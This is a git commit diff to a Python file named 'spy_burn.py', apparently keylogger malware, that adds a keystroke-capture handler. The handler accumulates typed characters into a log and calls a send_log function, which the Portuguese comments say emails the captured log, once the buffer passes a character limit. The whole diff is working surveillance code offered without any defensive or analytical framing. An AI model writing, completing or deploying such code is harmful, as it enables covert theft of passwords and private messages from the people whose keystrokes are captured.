0bfe823fa04a25cce1e66d6bc709c703122f529d
Mateus <mateustitob@hotmail.com>
2020-10-01 11:08:39 -0300

    capture keystroke and save log

--- spy_burn.py
+++ spy_burn.py
@@ -22,12 +22,35 @@ full_log = ''
 word = ''
 email_char_limit = 20 # limite dos caracteres
 
-'''
-
 # registrar a captura da tecla
 def on_press(key):
+    global word
+    global full_log
+    global email
+    global email_char_limit
 
-'''
+    if key == Key.space or key == Key.enter:
+        word += ' '
+        full_log += word
+        word = ''
+        if len(full_log) >= email_char_limit:
+            send_log()
+            full_log = ''
+    
+    elif key == Key.shift_l or key == Key.shift_r:
+        return
+    
+    elif key == Key.backspace:
+        word = word[:-1]
+    
+    else:
+        char = f'{key}'
+        char = char[1:-1]
+        word += char
+    
+    if key == Key.esc:
+        return False
+
 
 # enviar o log capturado para o email
 def send_log():
